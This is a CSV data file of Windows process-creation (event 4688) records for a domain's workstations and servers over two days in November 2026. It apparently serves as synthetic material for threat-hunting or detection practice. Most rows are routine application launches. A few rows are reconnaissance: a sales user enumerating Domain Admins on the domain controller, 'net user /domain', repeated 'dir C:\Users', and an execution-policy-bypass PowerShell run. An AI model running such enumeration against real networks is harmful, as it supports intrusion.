+2026-11-12 10:08:51,4688,100832,BKP01,admin01,C:\Windows\System32\powershell.exe,C:\Windows\System32\explorer.exe,"powershell.exe -NoProfile -Command ""Get-Service | Where-Object Status -eq Stopped"""
+2026-11-12 10:18:14,4688,100836,WS-IT-02,admin02,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-12 10:18:15,4688,100837,WS-FIN-01,priya.shetty,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-12 10:19:06,4688,100838,WS-HR-02,sanjay.pillai,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-12 10:25:20,4688,100841,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-12 10:32:40,4688,100842,WS-HR-02,harish.kulkarni,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-12 10:39:06,4688,100845,WS-FIN-06,shalini.bose,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-12 10:42:04,4688,100847,WS-SALES-04,pooja.gupta,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-12 10:50:30,4688,100848,WS-SALES-04,naveen.bose,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-12 10:57:58,4688,100850,WS-SALES-04,naveen.bose,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-12 11:00:24,4688,100851,WS-ENG-03,rohan.iyer,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-12 11:04:02,4688,100852,WS-ENG-08,vikram.shetty,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-12 11:07:49,4688,100853,WS-FIN-06,manoj.iyer,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-12 11:09:07,4688,100854,WS-HR-07,nisha.gupta,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-12 11:17:02,4688,100856,WS-HR-02,sanjay.pillai,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-12 11:17:21,4688,100857,WS-ENG-03,rohan.iyer,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-12 11:20:22,4688,100858,WS-FIN-06,shalini.bose,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-12 11:21:17,4688,100859,WS-FIN-06,manoj.iyer,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-12 11:26:45,4688,100861,WS-HR-02,sanjay.pillai,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-12 11:27:41,4688,100862,WS-HR-02,harish.kulkarni,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-12 11:27:53,4688,100863,WS-FIN-01,priya.shetty,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-12 11:29:45,4688,100866,WS-ENG-08,vikram.shetty,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-12 11:30:59,4688,100867,WS-SALES-04,naveen.bose,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-12 11:32:09,4688,100868,WS-IT-01,admin01,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-12 11:32:10,4688,100869,FS01,admin01,C:\Windows\System32\mmc.exe,C:\Windows\System32\explorer.exe,mmc.exe C:\Windows\system32\dsa.msc
+2026-11-12 11:33:49,4688,100870,WS-FIN-01,karthik.pillai,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-12 11:39:30,4688,100871,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-12 11:48:29,4688,100872,WS-HR-07,manoj.verma,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-12 11:50:24,4688,100873,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-12 11:54:50,4688,100874,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-12 12:04:25,4688,100881,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-12 12:08:06,4688,100882,FIN-SRV01,admin01,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c ipconfig /all
+2026-11-12 12:09:11,4688,100883,WS-HR-02,harish.kulkarni,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-12 12:10:30,4688,100884,WS-FIN-01,priya.shetty,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-12 12:13:19,4688,100885,WS-FIN-01,karthik.pillai,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-12 12:14:29,4688,100887,WS-SALES-04,pooja.gupta,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-12 12:18:01,4688,100888,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-12 12:18:12,4688,100889,WS-HR-02,sanjay.pillai,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-12 12:22:09,4688,100890,WS-FIN-01,priya.shetty,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-12 12:25:23,4688,100891,WS-HR-07,manoj.verma,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-12 12:33:28,4688,100893,WS-OPS-05,naveen.das,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-12 12:35:48,4688,100894,WS-ENG-03,rohan.iyer,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-12 12:36:39,4688,100895,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-12 12:38:32,4688,100896,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-12 12:43:44,4688,100897,WS-ENG-03,rohan.iyer,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-12 12:53:31,4688,100899,WS-FIN-01,karthik.pillai,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-12 12:57:41,4688,100900,WS-IT-02,admin02,C:\Windows\System32\powershell.exe,C:\Windows\System32\explorer.exe,powershell.exe -NoProfile -ExecutionPolicy Bypass -File \\FS01\IT\Scripts\deploy_agent.ps1
+2026-11-12 12:59:41,4688,100901,WS-IT-02,admin02,C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,cmd.exe /c gpupdate /force
+2026-11-12 13:02:56,4688,100902,WS-SALES-04,pooja.gupta,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-12 13:03:20,4688,100903,WS-HR-02,harish.kulkarni,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-12 13:04:03,4688,100905,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-12 13:08:13,4688,100907,WS-SALES-04,naveen.bose,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-12 13:12:28,4688,100909,WS-FIN-06,shalini.bose,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-12 13:12:51,4688,100910,WS-SALES-04,pooja.gupta,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-12 13:19:03,4688,100911,WS-HR-07,manoj.verma,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-12 13:27:58,4688,100913,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-12 13:45:09,4688,100918,WS-HR-07,nisha.gupta,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-12 13:46:01,4688,100919,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-12 13:48:41,4688,100922,DC01,naveen.bose,C:\Windows\System32\net.exe,C:\Windows\System32\cmd.exe,"net group ""Domain Admins"" /domain"
+2026-11-12 13:50:23,4688,100923,WS-SALES-04,pooja.gupta,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-12 13:59:30,4688,100924,WS-IT-02,admin02,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-12 14:00:17,4688,100925,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-12 14:00:42,4688,100926,WS-IT-01,admin01,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-12 14:04:11,4688,100927,WS-HR-07,manoj.verma,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-12 14:10:27,4688,100928,WS-FIN-01,priya.shetty,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-12 14:16:42,4688,100930,WS-HR-07,manoj.verma,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-12 14:29:11,4688,100931,WS-FIN-06,shalini.bose,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-12 14:31:50,4688,100933,WS-OPS-05,naveen.das,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-12 14:34:45,4688,100935,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-12 14:48:15,4688,100936,WS-HR-02,harish.kulkarni,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-12 14:49:35,4688,100937,WS-HR-02,harish.kulkarni,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-12 14:50:51,4688,100938,WS-HR-02,harish.kulkarni,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-12 15:09:15,4688,100939,WS-HR-07,nisha.gupta,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-12 15:11:15,4688,100940,WS-HR-07,nisha.gupta,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-12 15:11:22,4688,100941,WS-HR-07,nisha.gupta,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-12 15:14:14,4688,100942,WS-SALES-04,naveen.bose,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-12 15:26:28,4688,100944,WS-HR-02,harish.kulkarni,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-12 15:45:22,4688,100947,WS-IT-01,admin01,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-12 15:46:29,4688,100948,WS-HR-07,nisha.gupta,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-12 15:48:20,4688,100950,WS-SALES-04,naveen.bose,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-12 15:49:35,4688,100951,WS-IT-02,admin02,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-12 15:52:31,4688,100952,WS-SALES-04,naveen.bose,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-12 16:03:59,4688,100955,WS-HR-07,manoj.verma,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-12 16:09:35,4688,100956,BKP01,admin02,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c net user /domain
+2026-11-12 16:09:50,4688,100957,WS-FIN-01,karthik.pillai,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-12 16:10:18,4688,100958,WS-IT-01,admin01,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-12 16:11:04,4688,100959,WS-HR-02,harish.kulkarni,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-12 16:13:58,4688,100960,WS-HR-07,nisha.gupta,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-12 16:16:01,4688,100961,WS-HR-07,manoj.verma,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-12 16:24:13,4688,100963,WS-FIN-01,priya.shetty,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-12 16:32:30,4688,100967,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-12 16:34:22,4688,100968,WS-SALES-04,naveen.bose,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-12 16:34:34,4688,100969,WS-SALES-04,pooja.gupta,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-12 16:36:13,4688,100970,WS-FIN-01,priya.shetty,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-12 16:38:50,4688,100972,WS-IT-02,admin02,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-12 16:39:27,4688,100973,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-12 16:47:01,4688,100978,WS-FIN-01,karthik.pillai,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-12 16:49:31,4688,100979,WS-HR-07,manoj.verma,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-12 16:50:32,4688,100980,WS-ENG-08,vikram.shetty,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-12 16:55:03,4688,100981,WS-OPS-05,naveen.das,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-12 17:12:07,4688,100987,WS-OPS-05,naveen.das,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-12 17:16:04,4688,100988,SQL01,admin01,C:\Windows\System32\gpmc.msc,C:\Windows\System32\explorer.exe,C:\Windows\system32\gpmc.msc
+2026-11-12 17:30:08,4688,100991,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-12 17:32:02,4688,100992,WS-ENG-03,rohan.iyer,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-12 17:38:13,4688,100993,WS-FIN-01,priya.shetty,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-12 17:39:40,4688,100994,WS-ENG-08,vikram.shetty,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-12 17:40:39,4688,100995,WS-SALES-04,pooja.gupta,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-12 17:42:35,4688,100997,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-12 17:46:30,4688,100998,WS-SALES-04,naveen.bose,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-12 17:47:49,4688,100999,WS-FIN-01,priya.shetty,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-12 17:59:18,4688,101003,WS-FIN-06,manoj.iyer,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-12 18:29:00,4688,101012,WS-SALES-04,pooja.gupta,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-12 19:51:32,4688,101017,WS-OPS-10,priya.kumar,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-12 21:13:48,4688,101019,WS-OPS-05,karthik.bose,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-12 22:58:58,4688,101021,WS-OPS-05,karthik.bose,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-12 23:05:34,4688,101022,WS-OPS-10,priya.kumar,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-13 01:04:04,4688,101029,BKP01,svc_backup,C:\Windows\System32\wbadmin.exe,C:\Windows\System32\svchost.exe,wbadmin start backup -backupTarget:\\BKP01\Backups -include:\\FS01\Shares -quiet
+2026-11-13 01:04:40,4688,101030,WS-OPS-10,priya.kumar,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-13 01:17:34,4688,101033,WS-OPS-05,karthik.bose,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-13 01:21:16,4688,101034,WS-OPS-10,priya.kumar,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-13 02:31:32,4688,101036,WS-OPS-10,priya.kumar,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-13 02:46:17,4688,101037,WS-OPS-05,karthik.bose,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-13 03:25:35,4688,101039,WS-OPS-10,priya.kumar,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-13 03:30:46,4688,101040,WS-OPS-10,priya.kumar,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-13 05:03:14,4688,101042,WS-OPS-05,karthik.bose,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-13 05:59:30,4688,101043,WS-OPS-05,karthik.bose,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-13 07:23:58,4688,101048,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-13 08:18:22,4688,101051,WS-ENG-08,vikram.shetty,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-13 08:19:57,4688,101053,WS-HR-02,harish.kulkarni,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-13 08:29:18,4688,101054,WS-ENG-08,vikram.shetty,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-13 08:32:29,4688,101056,WS-ENG-03,rohan.iyer,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-13 08:35:44,4688,101058,WS-FIN-06,shalini.bose,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-13 08:39:15,4688,101060,WS-HR-07,nisha.gupta,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-13 08:43:49,4688,101062,WS-IT-01,admin01,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-13 08:44:46,4688,101064,WS-HR-02,sanjay.pillai,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-13 08:48:29,4688,101066,WS-FIN-01,karthik.pillai,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-13 08:54:50,4688,101068,WS-FIN-01,karthik.pillai,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-13 08:56:41,4688,101070,WS-IT-02,admin02,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-13 09:04:57,4688,101072,WS-ENG-03,rohan.iyer,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-13 09:06:05,4688,101073,WS-HR-02,sanjay.pillai,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-13 09:06:44,4688,101075,WS-FIN-06,manoj.iyer,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-13 09:14:01,4688,101077,WS-OPS-05,naveen.das,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-13 09:14:34,4688,101078,WS-FIN-06,manoj.iyer,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-13 09:19:16,4688,101081,WS-HR-07,manoj.verma,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-13 09:28:36,4688,101083,WS-FIN-01,karthik.pillai,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-13 09:35:22,4688,101085,WS-FIN-06,shalini.bose,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-13 09:38:23,4688,101087,WS-SALES-04,naveen.bose,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-13 09:46:23,4688,101089,WS-SALES-04,naveen.bose,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-13 09:46:28,4688,101090,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-13 09:55:26,4688,101091,WS-IT-01,admin01,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-13 09:56:59,4688,101092,WS-HR-02,sanjay.pillai,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-13 09:58:39,4688,101095,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-13 10:00:27,4688,101096,WS-HR-07,manoj.verma,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-13 10:04:55,4688,101099,WS-HR-02,harish.kulkarni,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-13 10:05:08,4688,101100,WS-SALES-04,pooja.gupta,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-13 10:06:36,4688,101102,WS-FIN-01,priya.shetty,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
